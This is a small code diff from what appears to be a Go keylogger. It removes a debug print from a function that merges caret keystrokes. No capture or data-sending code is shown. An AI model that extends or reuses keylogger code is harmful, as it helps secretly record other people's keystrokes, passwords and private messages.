@@ -256,7 +256,6 @@ func keylogger() {
 }
 
 func harmonize(tmp string, prec *string, caps bool) (bool,string){
-	fmt.Printf("prec : %s ; tmp : %s\n", *prec, tmp)
 	shouldWrite := false
 	if *prec == "^" && tmp == "^"{
 		tmp="^^"
